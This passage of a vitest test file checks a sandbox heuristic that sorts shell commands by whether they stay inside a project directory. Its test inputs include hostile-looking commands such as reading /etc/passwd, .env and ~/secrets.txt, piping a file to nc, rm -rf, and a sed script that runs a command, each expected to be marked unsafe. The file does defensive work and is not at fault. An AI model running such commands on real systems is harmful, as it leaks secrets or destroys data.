import { describe, it, expect, beforeAll, afterAll } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
    CommandTag,
    describeUnsafeReason,
    getCwdConfinementAssessment,
    getCwdConfinementPermission,
    getPathConfinementAssessment,
    Heuristic,
    UnsafeReason,
} from "../../../src/modules/sandbox/heuristics";
import type { SandboxConfigCwdConfinement } from "../../../src/common/config";

const CWD = "/project";

interface HeuristicTest {
    desc: string;
    command: string;
    config?: SandboxConfigCwdConfinement;
    expected: Heuristic;
}

const runTests = (tests: HeuristicTest[]) => {
    it.each(tests)("$desc", (test) => {
        expect(getCwdConfinementPermission(test.command, CWD, test.config ?? {})).toBe(
            test.expected,
        );
    });
};

describe("heuristic assessments", () => {
    it("reports a useful reason for unsafe commands", () => {
        expect(getCwdConfinementAssessment("cat /etc/passwd", CWD, {})).toEqual({
            classification: Heuristic.UNSAFE,
            reasons: [UnsafeReason.OUTSIDE_CWD],
            tags: [],
        });
        expect(getCwdConfinementAssessment("cat $(echo /etc/passwd)", CWD, {})).toEqual({
            classification: Heuristic.UNSAFE,
            reasons: [UnsafeReason.OUTSIDE_CWD],
            tags: [],
        });
    });

    it("deduplicates reasons and gives each a short description", () => {
        expect(getCwdConfinementAssessment("cat /etc/passwd && cat /etc/hosts", CWD, {})).toEqual({
            classification: Heuristic.UNSAFE,
            reasons: [UnsafeReason.OUTSIDE_CWD],
            tags: [],
        });
        expect(describeUnsafeReason(UnsafeReason.OUTSIDE_CWD))
            .toBe("a path is outside the working directory");
    });

    it("reports no reasons for safe classifications", () => {
        expect(getCwdConfinementAssessment("cat file.txt", CWD, {})).toEqual({
            classification: Heuristic.SAFE_READONLY,
            reasons: [],
            tags: [],
        });
    });

    it("tags successful git status operations across a chain", () => {
        expect(getCwdConfinementAssessment("git status --short && git log --oneline -1", CWD, {})).toEqual({
            classification: Heuristic.SAFE_READONLY,
            reasons: [],
            tags: [CommandTag.GIT_STATUS],
        });
    });

    it("reports path-specific reasons", () => {
        expect(getPathConfinementAssessment(".env", CWD, {})).toEqual({
            classification: Heuristic.UNSAFE,
            reasons: [UnsafeReason.SENSITIVE_PATH],
            tags: [],
        });
    });
});

describe("getCwdConfinementPermission", () => {
    describe("known commands within cwd", () => {
        runTests([
            { desc: "relative path", command: "cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "absolute path inside cwd", command: "cat /project/file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "nested relative path", command: "cat src/index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "dot path", command: "ls ./src", expected: Heuristic.SAFE_READONLY },
            { desc: "no arguments (reads stdin/cwd)", command: "cat", expected: Heuristic.SAFE_READONLY },
            { desc: "flags only", command: "ls -la", expected: Heuristic.SAFE_READONLY },
            { desc: "cwd itself", command: "ls /project", expected: Heuristic.SAFE_READONLY },
            { desc: "path with .. staying inside", command: "cat src/../README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "multiple files", command: "cat a.txt b.txt c.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "value flag consumed", command: "head -n 5 file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "value flag inline (short)", command: "head -n5 file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "value flag inline (long)", command: "head --lines=5 file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "double dash separator", command: "cat -- -weird-name", expected: Heuristic.SAFE_READONLY },
            { desc: "lone dash (stdin)", command: "cat -", expected: Heuristic.SAFE_READONLY },
            { desc: "no positional args command", command: "pwd", expected: Heuristic.SAFE_READONLY },
            { desc: "ignore positionals command", command: "echo hello world", expected: Heuristic.SAFE_READONLY },
            { desc: "env assignment prefix", command: "FOO=bar cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "quoted path", command: 'cat "my file.txt"', expected: Heuristic.SAFE_READONLY },
            { desc: "cd changes cwd for following command", command: "cd src && cat index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "cd keeps confinement rooted at the original cwd", command: "cd src && cat ../README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "cd parent escape is rejected", command: "cd src && cat ../../outside.txt", expected: Heuristic.UNSAFE },
            { desc: "cd - returns to the previous cwd", command: "cd src && cd - && cat README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "cd home is rejected", command: "cd && cat README.md", expected: Heuristic.UNSAFE },
            { desc: "pushd and popd restore cwd", command: "pushd src && cat index.ts && popd && cat README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "nested pushd/popd uses a stack", command: "pushd src && pushd lib && cat file.ts && popd && cat ../README.md && popd", expected: Heuristic.SAFE_READONLY },
            { desc: "pushd outside cwd falls back", command: "pushd /tmp && cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "unsupported pushd rotation falls back", command: "pushd", expected: Heuristic.UNSAFE },
            { desc: "indexed pushd rotation falls back", command: "pushd +1", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("complex directory state", () => {
        runTests([
            {
                desc: "directory state persists across lines",
                command: "cd src\npushd lib\ncat file.ts\npopd\ncat ../README.md",
                expected: Heuristic.SAFE_READONLY,
            },
            {
                desc: "cd and stack operations compose",
                command: "cd src && pushd ../tests && cd .. && popd && cat ../README.md",
                expected: Heuristic.SAFE_READONLY,
            },
            {
                desc: "multiple pushd/popd pairs return to root",
                command: "pushd src && pushd lib && popd && pushd tests && popd && popd && cat README.md",
                expected: Heuristic.SAFE_READONLY,
            },
            {
                desc: "stacked directory traversal cannot escape after restore",
                command: "pushd src && pushd lib && popd && popd && cat ../../outside.txt",
                expected: Heuristic.UNSAFE,
            },
            {
                desc: "pipeline cd does not change the following command cwd",
                command: "cd src | cat ../README.md",
                expected: Heuristic.UNSAFE,
            },
            {
                desc: "background cd does not change the following command cwd",
                command: "cd src & cat ../README.md",
                expected: Heuristic.UNSAFE,
            },
            {
                desc: "directory expansion is not guessed",
                command: "pushd \"$(echo src)\" && cat file.ts",
                expected: Heuristic.UNSAFE,
            },
            {
                desc: "sensitive directory is rejected",
                command: "pushd .git && cat config",
                expected: Heuristic.UNSAFE,
            },
        ]);
    });

    describe("directory edge cases", () => {
        runTests([
            { desc: "cd with --", command: "cd -- src && cat file.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "cd logical mode", command: "cd -L src && cat file.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "cd physical mode", command: "cd -P src && cat file.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "cd relative dot path", command: "cd ./src/../src && cat file.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "cd to project root from a child", command: "cd src && cd .. && cat README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "cd above project root falls back", command: "cd src && cd ../.. && cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "cd - before a previous directory falls back", command: "cd - && cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "repeated cd - toggles directories", command: "cd src && cd - && cd - && cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "pushd with --", command: "pushd -- src && popd -- && cat README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "pushd parent traversal staying inside", command: "pushd src && pushd .. && popd && cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "pushd parent traversal escaping", command: "pushd src && pushd ../.. && cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "popd after cd restores stack top", command: "pushd src && cd .. && popd && cat file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "empty popd leaves cwd unchanged", command: "popd && cat README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "directory variable expansion falls back", command: "cd \"$PWD/src\" && cat file.ts", expected: Heuristic.UNSAFE },
            { desc: "directory glob expansion falls back", command: "pushd src/* && cat file.ts", expected: Heuristic.UNSAFE },
            { desc: "directory redirection is conservatively classified", command: "cd src > cd.log && cat file.ts", expected: Heuristic.UNSAFE },
            { desc: "relative output path uses tracked cwd", command: "cd src && sort -o ../sorted.txt input.txt", expected: Heuristic.SAFE_EDIT },
            { desc: "tracked cwd still checks sensitive paths", command: "cd src && cat ../.env", expected: Heuristic.UNSAFE },
            { desc: "benign assignment before cd", command: "FOO=bar cd src && cat file.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "dangerous assignment before cd", command: "PATH=/tmp cd src && cat file.ts", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("paths outside cwd fall back", () => {
        runTests([
            { desc: "absolute path outside", command: "cat /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "parent traversal escape", command: "cat ../outside.txt", expected: Heuristic.UNSAFE },
            { desc: "home path outside cwd", command: "cat ~/secrets.txt", expected: Heuristic.UNSAFE },
            { desc: "ls outside dir", command: "ls /tmp", expected: Heuristic.UNSAFE },
            { desc: "flag path value outside", command: "sort -o /tmp/out.txt file.txt", expected: Heuristic.UNSAFE },
            { desc: "unknown long flag with path value", command: "ls --foo=/etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "path flag value outside (inline)", command: "sort --output=/tmp/out file", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("unknown commands fall back", () => {
        runTests([
            { desc: "unknown command", command: "npm install", expected: Heuristic.UNSAFE },
            { desc: "unknown command with in-cwd path", command: "curl ./file.txt", expected: Heuristic.UNSAFE },
            { desc: "command invoked by absolute path", command: "/tmp/evil/cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "command invoked by relative path", command: "./cat file.txt", expected: Heuristic.UNSAFE },
            { desc: "empty command", command: "", expected: Heuristic.UNSAFE },
            { desc: "whitespace command", command: "   ", expected: Heuristic.UNSAFE },
            { desc: "only env assignment", command: "FOO=bar", expected: Heuristic.UNSAFE },
            { desc: "positionals on no-positional command", command: "pwd /project", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("chained and multi-line commands", () => {
        runTests([
            { desc: "pipe of known commands", command: "cat file.txt | grep foo", expected: Heuristic.SAFE_READONLY },
            { desc: "chain with &&", command: "ls src && cat src/index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "multi-line known commands", command: "cat a.txt\nls b.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "chain with unknown command", command: "cat file.txt && rm -rf x", expected: Heuristic.UNSAFE },
            { desc: "pipe with unknown command", command: "cat file.txt | nc host 80", expected: Heuristic.UNSAFE },
            { desc: "second command escapes cwd", command: "cat a.txt\ncat /etc/passwd", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("redirections", () => {
        runTests([
            { desc: "write within cwd", command: "cat a.txt > b.txt", expected: Heuristic.SAFE_EDIT },
            { desc: "append within cwd", command: "echo hello >> log.txt", expected: Heuristic.SAFE_EDIT },
            { desc: "substitution output redirection within cwd", command: "echo hello > $(echo log.txt)", expected: Heuristic.SAFE_EDIT },
            { desc: "stderr to /dev/null", command: "ls src 2>/dev/null", expected: Heuristic.SAFE_READONLY },
            { desc: "read from within cwd", command: "wc -l < file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "write outside cwd", command: "cat a.txt > /tmp/out.txt", expected: Heuristic.UNSAFE },
            { desc: "stderr outside cwd", command: "ls 2> /tmp/err.txt", expected: Heuristic.UNSAFE },
            { desc: "read from outside cwd", command: "wc -l < /etc/passwd", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("grep pattern handling", () => {
        runTests([
            { desc: "pattern skipped, no paths", command: "grep foo file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "pattern with slash skipped", command: "grep foo/bar file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "recursive within cwd", command: "grep -rn foo ./src", expected: Heuristic.SAFE_READONLY },
            { desc: "path outside as file arg", command: "grep foo /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "-e makes all positionals paths", command: "grep -e foo /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "-e with contained paths", command: "grep -e foo a.txt b.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "inline -e (short) makes positionals paths", command: "grep -efoo /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "--regexp makes positionals paths", command: "grep --regexp foo /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "--regexp= inline", command: "grep --regexp=foo /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "-f pattern file inside cwd", command: "grep -f patterns.txt file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "-f pattern file outside cwd", command: "grep -f /etc/patterns file.txt", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("sed and stream text filters", () => {
        runTests([
            { desc: "sed prints a line range", command: "sed -n '1,120p' file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "sed prints a regex range", command: "sed -n '/start/,/end/p' file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "sed with -e expression", command: "sed -e '1p' -e '5p' file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "sed substitution", command: "sed 's/foo/bar/g' file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "sed input outside cwd", command: "sed -n '1,10p' /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "sed execute command script falls back", command: "sed -n '1e id' file.txt", expected: Heuristic.UNSAFE },
            { desc: "sed script with embedded command substitution falls back", command: "sed -n \"$(grep -n start file.txt),+10p\" file.txt", expected: Heuristic.UNSAFE },
            { desc: "sed write-file script falls back", command: "sed -n '1w /tmp/out' file.txt", expected: Heuristic.UNSAFE },
            { desc: "sed in-place falls back", command: "sed -i 's/a/b/' file.txt", expected: Heuristic.UNSAFE },
            { desc: "sed script file is not inspected", command: "sed -f transform.sed file.txt", expected: Heuristic.UNSAFE },
            { desc: "fold", command: "fold -w 80 README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "fmt", command: "fmt -w 80 README.md", expected: Heuristic.SAFE_READONLY },
            { desc: "expand", command: "expand -t 8 Makefile", expected: Heuristic.SAFE_READONLY },
            { desc: "unexpand", command: "unexpand -a Makefile", expected: Heuristic.SAFE_READONLY },
            { desc: "nl", command: "nl -ba src/index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "tac", command: "tac -s '\\n' file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "rev", command: "rev file.txt", expected: Heuristic.SAFE_READONLY },
        ]);
    });

    describe("find safety", () => {
        runTests([
            { desc: "simple find within cwd", command: "find . -name foo", expected: Heuristic.SAFE_READONLY },
            { desc: "find with path", command: "find src -type f", expected: Heuristic.SAFE_READONLY },
            { desc: "find outside cwd", command: "find /etc -name foo", expected: Heuristic.UNSAFE },
            { desc: "find -delete is unsafe", command: "find . -name foo -delete", expected: Heuristic.UNSAFE },
            { desc: "find -exec is unsafe", command: "find . -exec rm {} \\;", expected: Heuristic.UNSAFE },
            { desc: "find -execdir is unsafe", command: "find . -execdir echo {} +", expected: Heuristic.UNSAFE },
            { desc: "find -fprintf is unsafe", command: "find . -fprintf out.txt %p", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("ripgrep", () => {
        runTests([
            { desc: "pattern + file", command: "rg foo src/index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "type and glob flags", command: "rg -t ts -g '*.test.ts' foo .", expected: Heuristic.SAFE_READONLY },
            { desc: "-e makes all positionals paths (escape)", command: "rg -e foo /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "-e with contained paths", command: "rg -e foo a.txt b.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "-f pattern file inside cwd", command: "rg -f patterns.txt src", expected: Heuristic.SAFE_READONLY },
            { desc: "-f pattern file outside cwd", command: "rg -f /etc/patterns src", expected: Heuristic.UNSAFE },
            { desc: "inline value flags", command: "rg --max-depth=2 --max-columns=100 foo .", expected: Heuristic.SAFE_READONLY },
            { desc: "--pre runs a program: falls back", command: "rg --pre zstdcat foo .", expected: Heuristic.UNSAFE },
            { desc: "--follow descends into symlinks: falls back", command: "rg --follow foo .", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("fd", () => {
        runTests([
            { desc: "pattern only (searches cwd)", command: "fd foo", expected: Heuristic.SAFE_READONLY },
            { desc: "pattern + path", command: "fd index src", expected: Heuristic.SAFE_READONLY },
            { desc: "value flags", command: "fd -e ts -t f foo", expected: Heuristic.SAFE_READONLY },
            { desc: "path outside cwd", command: "fd foo /etc", expected: Heuristic.UNSAFE },
            { desc: "-x runs a command on results: falls back", command: "fd -x wc {}", expected: Heuristic.UNSAFE },
            { desc: "--exec-batch is unsafe", command: "fd --exec-batch wc {}", expected: Heuristic.UNSAFE },
            { desc: "-L descends into symlinks: falls back", command: "fd -L foo", expected: Heuristic.UNSAFE },
            { desc: "fdfind alias", command: "fdfind foo", expected: Heuristic.SAFE_READONLY },
        ]);
    });

    describe("file comparison", () => {
        runTests([
            { desc: "diff two files", command: "diff a.txt b.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "diff -U with value", command: "diff -U 3 a.txt b.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "diff -r dirs", command: "diff -r src dist", expected: Heuristic.SAFE_READONLY },
            { desc: "diff path outside cwd", command: "diff a.txt /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "diff -X exclude-from file", command: "diff -X excludes.txt -r src dist", expected: Heuristic.SAFE_READONLY },
            { desc: "diff3", command: "diff3 a.txt b.txt c.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "cmp", command: "cmp a.txt b.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "cmp -n bytes flag", command: "cmp -n 100 a.txt b.txt", expected: Heuristic.SAFE_READONLY },
        ]);
    });

    describe("checksums", () => {
        runTests([
            { desc: "sha256sum file", command: "sha256sum file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "md5sum check mode", command: "md5sum -c sums.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "cksum multiple files", command: "cksum a.txt b.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "sha256sum outside cwd", command: "sha256sum /etc/passwd", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("binary and compressed readers", () => {
        runTests([
            { desc: "base64 encode file", command: "base64 file.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "base64 decode with output", command: "base64 -w 0 -d enc.b64 -o file.txt", expected: Heuristic.SAFE_EDIT },
            { desc: "base64 input outside cwd", command: "base64 /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "strings with min length", command: "strings -n 8 binary.bin", expected: Heuristic.SAFE_READONLY },
            { desc: "od format flags", command: "od -A d -t x1 file.bin", expected: Heuristic.SAFE_READONLY },
            { desc: "od outside cwd", command: "od /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "hexdump", command: "hexdump -C file.bin", expected: Heuristic.SAFE_READONLY },
            { desc: "xxd", command: "xxd -l 16 file.bin", expected: Heuristic.SAFE_READONLY },
            { desc: "xxd -r writes files: falls back", command: "xxd -r out.bin in.hex", expected: Heuristic.UNSAFE },
            { desc: "xxd --post runs a program: falls back", command: "xxd --post gzip file.bin", expected: Heuristic.UNSAFE },
            { desc: "zcat", command: "zcat file.gz", expected: Heuristic.SAFE_READONLY },
            { desc: "zcat outside cwd", command: "zcat /etc/passwd.gz", expected: Heuristic.UNSAFE },
            { desc: "zgrep pattern + file", command: "zgrep foo file.gz", expected: Heuristic.SAFE_READONLY },
            { desc: "zgrep -e makes positionals paths (escape)", command: "zgrep -e foo /etc/passwd.gz", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("archives", () => {
        runTests([
            { desc: "tar list archive", command: "tar -tzf archive.tar.gz", expected: Heuristic.SAFE_READONLY },
            { desc: "tar list with separate -f", command: "tar -t -f archive.tar", expected: Heuristic.SAFE_READONLY },
            { desc: "tar extract: falls back", command: "tar -xzf archive.tar.gz", expected: Heuristic.UNSAFE },
            { desc: "tar create: falls back", command: "tar -czf out.tar.gz src", expected: Heuristic.UNSAFE },
            { desc: "tar --to-command: falls back", command: "tar -tzf a.tar.gz --to-command wc", expected: Heuristic.UNSAFE },
            { desc: "tar archive outside cwd", command: "tar -tzf /opt/a.tar.gz", expected: Heuristic.UNSAFE },
            { desc: "zipinfo list contents", command: "zipinfo archive.zip", expected: Heuristic.SAFE_READONLY },
            { desc: "zipinfo outside cwd", command: "zipinfo /opt/a.zip", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("jq", () => {
        runTests([
            { desc: "filter + file", command: "jq '.name' data.json", expected: Heuristic.SAFE_READONLY },
            { desc: "-n with no file", command: "jq -n '1 + 1'", expected: Heuristic.SAFE_READONLY },
            { desc: "--arg with value", command: "jq --arg x 5 '.x' data.json", expected: Heuristic.SAFE_READONLY },
            { desc: "-f program file inside cwd", command: "jq -f prog.jq data.json", expected: Heuristic.SAFE_READONLY },
            { desc: "-f program file outside cwd", command: "jq -f /etc/prog.jq data.json", expected: Heuristic.UNSAFE },
            { desc: "file outside cwd", command: "jq '.name' /etc/data.json", expected: Heuristic.UNSAFE },
            { desc: "--slurpfile name+file, file slot path-checked", command: "jq --slurpfile x data.json '.x'", expected: Heuristic.SAFE_READONLY },
            { desc: "--slurpfile file slot outside cwd", command: "jq --slurpfile x /etc/data.json '.x'", expected: Heuristic.UNSAFE },
            { desc: "--rawfile file slot outside cwd", command: "jq --rawfile x /etc/data.json '.x'", expected: Heuristic.UNSAFE },
            { desc: "-L module dir inside cwd", command: "jq -L lib '.name' data.json", expected: Heuristic.SAFE_READONLY },
            { desc: "-L module dir outside cwd", command: "jq -L /etc/jq '.name' data.json", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("system utilities", () => {
        runTests([
            { desc: "date", command: "date", expected: Heuristic.SAFE_READONLY },
            { desc: "date with date string", command: "date -d '2024-01-01' -u", expected: Heuristic.SAFE_READONLY },
            { desc: "date reading dates from file", command: "date -f dates.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "date file outside cwd", command: "date -f /etc/hostname", expected: Heuristic.UNSAFE },
            { desc: "sleep", command: "sleep 100", expected: Heuristic.SAFE_READONLY },
            { desc: "which", command: "which node", expected: Heuristic.SAFE_READONLY },
            { desc: "whereis", command: "whereis git", expected: Heuristic.SAFE_READONLY },
            { desc: "type", command: "type -t cat", expected: Heuristic.SAFE_READONLY },
            { desc: "uname", command: "uname -a", expected: Heuristic.SAFE_READONLY },
            { desc: "uname with positional falls back", command: "uname foo", expected: Heuristic.UNSAFE },
            { desc: "hostname", command: "hostname", expected: Heuristic.SAFE_READONLY },
            { desc: "hostname -F file", command: "hostname -F hosts.txt", expected: Heuristic.SAFE_READONLY },
            { desc: "hostname -F outside cwd", command: "hostname -F /etc/hosts", expected: Heuristic.UNSAFE },
            { desc: "nproc", command: "nproc", expected: Heuristic.SAFE_READONLY },
            { desc: "nproc --ignore", command: "nproc --ignore=2", expected: Heuristic.SAFE_READONLY },
            { desc: "free", command: "free -h", expected: Heuristic.SAFE_READONLY },
            { desc: "id", command: "id -u", expected: Heuristic.SAFE_READONLY },
            { desc: "df", command: "df -h .", expected: Heuristic.SAFE_READONLY },
            { desc: "df outside cwd", command: "df /etc", expected: Heuristic.UNSAFE },
        ]);
    });

    describe("git", () => {
        runTests([
            { desc: "git status", command: "git status", expected: Heuristic.SAFE_READONLY },
            { desc: "git status -sb", command: "git status -sb", expected: Heuristic.SAFE_READONLY },
            { desc: "git status with pathspec", command: "git status src", expected: Heuristic.SAFE_READONLY },
            { desc: "git status pathspec outside cwd", command: "git status /etc", expected: Heuristic.UNSAFE },
            { desc: "git status pathspec to .git is sensitive", command: "git status .git", expected: Heuristic.UNSAFE },
            { desc: "git log", command: "git log --oneline -20", expected: Heuristic.SAFE_READONLY },
            { desc: "git log value flags", command: "git log --since 2024-01-01 --author alice -n 5", expected: Heuristic.SAFE_READONLY },
            { desc: "git log rev range", command: "git log main..develop", expected: Heuristic.SAFE_READONLY },
            { desc: "git log -- pathspec", command: "git log -- src/index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "git log --stat is metadata only", command: "git log --stat -3", expected: Heuristic.SAFE_READONLY },
            { desc: "git log -C is detect-copies, not the global -C", command: "git log -C", expected: Heuristic.SAFE_READONLY },
            { desc: "git log -p prints history contents", command: "git log -p", expected: Heuristic.SAFE_READONLY },
            { desc: "git log --patch prints history contents", command: "git log --patch", expected: Heuristic.SAFE_READONLY },
            { desc: "git log -U prints history contents", command: "git log -U3", expected: Heuristic.SAFE_READONLY },
            { desc: "git ls-files", command: "git ls-files", expected: Heuristic.SAFE_READONLY },
            { desc: "git ls-files pathspec", command: "git ls-files src", expected: Heuristic.SAFE_READONLY },
            { desc: "git ls-files others", command: "git ls-files -z --others --exclude-standard", expected: Heuristic.SAFE_READONLY },
            { desc: "git describe", command: "git describe --tags", expected: Heuristic.SAFE_READONLY },
            { desc: "git rev-parse", command: "git rev-parse --abbrev-ref HEAD", expected: Heuristic.SAFE_READONLY },
            { desc: "git rev-parse --show-toplevel", command: "git rev-parse --show-toplevel", expected: Heuristic.SAFE_READONLY },
            { desc: "git branch list", command: "git branch -av", expected: Heuristic.SAFE_READONLY },
            { desc: "git branch create: falls back", command: "git branch feature", expected: Heuristic.UNSAFE },
            { desc: "git branch delete: falls back", command: "git branch -d feature", expected: Heuristic.UNSAFE },
            { desc: "git branch delete inline: falls back", command: "git branch --delete=feature", expected: Heuristic.UNSAFE },
            { desc: "git branch edit description: falls back", command: "git branch --edit-description", expected: Heuristic.UNSAFE },
            { desc: "git branch set upstream inline: falls back", command: "git branch --set-upstream-to=origin/main", expected: Heuristic.UNSAFE },
            { desc: "git tag list", command: "git tag -n", expected: Heuristic.SAFE_READONLY },
            { desc: "git tag create: falls back", command: "git tag v1.0.0", expected: Heuristic.UNSAFE },
            { desc: "git tag annotate inline: falls back", command: "git tag --annotate=v1.0.0", expected: Heuristic.UNSAFE },
            { desc: "git tag delete inline: falls back", command: "git tag --delete=v1.0.0", expected: Heuristic.UNSAFE },
            { desc: "git diff --check", command: "git diff --check", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff explicit pathspec", command: "git diff -- src/index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff --check explicit pathspec", command: "git diff --check -- src/index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff --check explicit pathspec outside cwd", command: "git diff --check -- /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "git diff --check quiet", command: "git diff --check --quiet", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff --stat", command: "git diff --stat", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff --stat revision range", command: "git diff --stat HEAD~2..HEAD", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff --name-status revision range", command: "git diff --name-status HEAD~2..HEAD", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff --name-only revision range", command: "git diff --name-only HEAD~2..HEAD", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff metadata chain", command: "git diff --stat HEAD~2..HEAD && git diff --name-status HEAD~2..HEAD", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff stat and name-only chain", command: "git diff --stat 3ce7afd..HEAD && git diff --name-only 3ce7afd..HEAD", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff --check, stat, and status", command: "git diff --check && git diff --stat && git status --short", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff quiet staged", command: "git diff --quiet --cached", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff --check quiet revision and pathspec", command: "git diff --check --quiet HEAD -- src/index.ts", expected: Heuristic.SAFE_READONLY },
            { desc: "git diff --check quiet pathspec outside cwd", command: "git diff --check --quiet -- /etc/passwd", expected: Heuristic.UNSAFE },
            { desc: "git diff without quiet: falls back", command: "git diff", expected: Heuristic.UNSAFE },
            { desc: "git diff patch output with quiet: falls back", command: "git diff --quiet --patch", expected: Heuristic.UNSAFE },
            { desc: "git diff external helper with quiet: falls back", command: "git diff --quiet --ext-diff", expected: Heuristic.UNSAFE },
            { desc: "git show stat and summary metadata", command: "git show --stat --summary HEAD", expected: Heuristic.SAFE_READONLY },
            { desc: "git show stat with oneline", command: "git show --stat --oneline fb8f629", expected: Heuristic.SAFE_READONLY },
            { desc: "git show name-only metadata", command: "git show --format= --name-only HEAD", expected: Heuristic.SAFE_READONLY },
            { desc: "git show prints historical content", command: "git show HEAD", expected: Heuristic.SAFE_READONLY },
            { desc: "git show cannot write output files", command: "git show --output=review.patch HEAD", expected: Heuristic.UNSAFE },
            { desc: "credential-printing subcommand remote: falls back", command: "git remote -v", expected: Heuristic.UNSAFE },
            { desc: "config subcommand: falls back", command: "git config --list", expected: Heuristic.UNSAFE },
            { desc: "network subcommand: falls back", command: "git fetch origin", expected: Heuristic.UNSAFE },
            { desc: "mutating subcommand: falls back", command: "git checkout main", expected: Heuristic.UNSAFE },
            // Destructive and network-capable git commands must not become
            // heuristic allows merely because they use an in-cwd path/ref.
            { desc: "git add: falls back", command: "git add file.txt", expected: Heuristic.UNSAFE },
            { desc: "git commit: falls back", command: "git commit -m message", expected: Heuristic.UNSAFE },
            { desc: "git reset: falls back", command: "git reset --hard HEAD", expected: Heuristic.UNSAFE },
            { desc: "git clean: falls back", command: "git clean -fd", expected: Heuristic.UNSAFE },
            { desc: "git restore: falls back", command: "git restore file.txt", expected: Heuristic.UNSAFE },
            { desc: "git rm: falls back", command: "git rm file.txt", expected: Heuristic.UNSAFE },
            { desc: "git mv: falls back", command: "git mv old.txt new.txt", expected: Heuristic.UNSAFE },
            { desc: "git branch delete: falls back", command: "git branch -D feature", expected: Heuristic.UNSAFE },
            { desc: "git tag delete: falls back", command: "git tag -d v1.0.0", expected: Heuristic.UNSAFE },
            { desc: "git merge: falls back", command: "git merge feature", expected: Heuristic.UNSAFE },
            { desc: "git rebase: falls back", command: "git rebase main", expected: Heuristic.UNSAFE },
            { desc: "git cherry-pick: falls back", command: "git cherry-pick HEAD", expected: Heuristic.UNSAFE },
